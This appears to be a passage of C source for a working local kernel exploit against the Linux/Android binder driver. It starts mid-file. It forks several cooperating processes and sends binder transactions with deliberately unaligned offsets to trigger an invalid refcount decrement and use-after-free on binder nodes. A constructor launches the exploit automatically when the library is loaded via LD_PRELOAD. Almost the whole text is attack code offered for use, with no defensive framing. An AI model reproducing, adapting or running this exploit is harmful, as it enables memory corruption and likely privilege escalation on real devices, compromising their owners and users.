}

void process_a_register(LocalCtx *ctx) {
    static usize handle_iteration = 0;

    binder_client_init(&ctx->binder, NULL);

    LOGD("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(ctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        ctx->binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER + handle_iteration,
        0,
        &ctx->ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    binder_enter_looper(ctx->binder.fd);

    connect_process_c(ctx);
    connect_process_d(ctx);
}

void process_a_deregister(LocalCtx *ctx) {
    binder_client_destroy(&ctx->binder);
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    LocalCtx local_ctx = { 0 };
    local_ctx.ctx = ctx;

    do_a(&local_ctx);
}

void uaf_nodes(LocalCtx *ctx, binder_uintptr_t base_id, u64 node_count, bool use_async) {
    PipeCommand command = { 0 };
    command.header.command_type = UAF_NODE;
    command.header.body_size = sizeof(UafNodeArgs);

    UafNodeArgs *args = calloc(1, sizeof(UafNodeArgs));
    args->base_id = base_id;
    args->node_count = node_count;
    args->use_async = use_async;
    command.data = args;

    send_pipe_command(&ctx->ctx->b_pipe, &command);
    pipe_command_drop(command);

    u32 b_handle = recv_strong_handle(&ctx->binder, -1);

    send_multiple_nodes(&ctx->binder, b_handle, base_id, node_count);

    await_response(&ctx->ctx->b_pipe);

    LOGD("A: got uaf on nodes");
}

// reads out workqueue items which are still in place for uaf nodes
void uaf_flush_read(LocalCtx *ctx, u64 node_count) {
    u8 read_buf[128] = { 0 };
    usize read_amount = 0;

    u64 increfs_count = 0;
    u64 acquire_count = 0;
    u64 tr_complete_count = 0;

    while (tr_complete_count < 1) {
        binder_read(ctx->binder.fd, read_buf, sizeof(read_buf), &read_amount);

        // cont all 3 seperately
        // it seems it is possible for orders to change, and we need to consume all of them
        acquire_count += binder_read_buffer_count(read_buf, read_amount, BR_ACQUIRE);
        increfs_count += binder_read_buffer_count(read_buf, read_amount, BR_INCREFS);
        tr_complete_count += binder_read_buffer_count(read_buf, read_amount, BR_TRANSACTION_COMPLETE);
    }
}

typedef struct {
    binder_client_t binder;
    u32 a_handle;
    bool active;
} BContext;

void bcontext_deactivate(BContext *bctx) {
    binder_client_destroy(&bctx->binder);
    bctx->active = false;
}

// sets up a connection with a
void acquire_a_handle(ExploitCtx *ctx, BContext *bctx) {
    if (bctx->active) {
        bcontext_deactivate(bctx);
    }

    binder_client_init(&bctx->binder, NULL);
    bctx->active = true;

    u32 token_manager_handle = 0;
    int ret = find_token_manager(bctx->binder.fd, &token_manager_handle);
    if (ret < 0) {
        panic("Failed to create binder client");
    }

    ret = token_manager_lookup(
        bctx->binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &bctx->a_handle
    );
    if (ret < 0) {
        panic("Failed to lookup a binder context");
    }

    binder_enter_looper(bctx->binder.fd);

    // send a node for this process to a
    send_node(&bctx->binder, bctx->a_handle, PROCESS_B_BINDER, true);
}

// process b receives commands from a and does actions
void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        LOGD("B: listening for next command...");
        PipeCommand command = recv_pipe_command(&ctx->b_pipe);

        switch (command.header.command_type) {
            case UAF_NODE: {
                UafNodeArgs *args = (UafNodeArgs *) command.data;
                LOGD("B: got UAF command base id: %llu, count: %lu", args->base_id, args->node_count);

                u32 *refs = calloc(args->node_count, sizeof(u32));
                acquire_a_handle(ctx, &bctx);

                LOGD("B: acquired A handle");

                recv_multiple_nodes(&bctx.binder, refs, args->node_count);

                LOGD("B: received handles");

                u8 read_buf[256] = { 0 };
                usize read_amount = 0;

                // send empty message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    // binder_register_death(bctx.binder.fd, refs[i], 0x6969);

                    if (args->use_async) {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, TF_ONE_WAY);
                        binder_txn_dispatch(message, bctx.binder.fd, false, NULL, 0, NULL);

                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    } else {
                        struct binder_txn *message = binder_txn_create(refs[i], 0, 0);
                        sync_txn_dispatch(bctx.binder.fd, message);

                        binder_txn_destroy(message);
                    }
                }

                LOGD("B: sent fake messages");

                // send vulnerable message to each node
                for (usize i = 0; i < args->node_count; i++) {
                    for (usize j = 0; j < 1; j++) {
                        struct binder_txn *vuln_message = binder_txn_create(refs[i], 0, TF_ONE_WAY);

                        binder_txn_add_binder_object(vuln_message, args->base_id + i, 0);
                        // padding object to make sure buffer doesn't have issue with double decrament
                        binder_txn_add_binder_object(vuln_message, -1, 0);
                        // make offsets unaligned
                        vuln_message->offsets_size -= 1;

                        binder_txn_dispatch(vuln_message, bctx.binder.fd, false, NULL, 0, NULL);
                        binder_txn_destroy(vuln_message);

                        // read error code
                        // allows more errors to be setn in future
                        binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);
                    }
                }

                LOGD("B: triggered invalid refcount decrament");

                bcontext_deactivate(&bctx);
                free(refs);

                LOGD("B: closed binder context");

                response = COMMAND_OK;
            } break;
            default: {
                LOG("B: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(&ctx->b_pipe, response);
    }
}

// process C does nothing but exist as a process that process A can send binder nodes to
// we need a recepient process of a ref when allocating binder node
// and process B closes its binder context frequently so another process is needed
void holder_process(ExploitCtx *ctx, CommandPipe *pipe) {
    pin_to_cpu(0);

    BContext bctx = { 0 };
    bctx.active = false;

    u8 read_buf[256] = { 0 };
    usize read_amount = 0;
    binder_uintptr_t node_counter = 0;

    for (;;) {
        PipeCommandResponse response = COMMAND_ERROR;

        // LOGD("C: listening for next command...");
        PipeCommand command = recv_pipe_command(pipe);

        switch (command.header.command_type) {
            case RECV_NODE: {
                LOGD("C: receiving node...");
                if (bctx.active) {
                    // TODO: figure out if receiving transaction and acknowledging it
                    // or just ignroing it is better (less allocations?)
                    recv_strong_handle(&bctx.binder, bctx.a_handle);
                    response = COMMAND_OK;
                }
            } break;
            case RESET_CONTEXT: {
                bcontext_deactivate(&bctx);
                LOGD("C: deactivated context");
                response = COMMAND_OK;
            } break;
            case ACQUIRE_CONTEXT: {
                acquire_a_handle(ctx, &bctx);
                LOGD("C: reacquired context");
                response = COMMAND_OK;
            } break;
            case SEND_NODE: {
                // can't use send node, cause send node uses async,
                // and async needs to free the buffer before receiving transactions
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_add_binder_object(txn, node_counter, 0x69);
                    node_counter += 1;
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            case SEND_EMPTY: {
                if (bctx.active) {
                    struct binder_txn *txn = binder_txn_create(bctx.a_handle, 0, 0);
                    binder_txn_dispatch(txn, bctx.binder.fd, false, NULL, 0, NULL);
                    binder_txn_destroy(txn);

                    // read response
                    binder_read(bctx.binder.fd, read_buf, sizeof(read_buf), &read_amount);

                    response = COMMAND_OK;
                }
            } break;
            default: {
                LOG("C: Invalid command recieved");
            }
        }

        pipe_command_drop(command);
        send_command_response(pipe, response);
    }
}

void process_c(ExploitCtx *ctx) {
    holder_process(ctx, &ctx->c_pipe);
}

void process_d(ExploitCtx *ctx) {
    holder_process(ctx, &ctx->d_pipe);
}

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    } else if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else if (SYSCHK(fork()) == 0) {
        process_c(ctx);
    } else {
        process_d(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}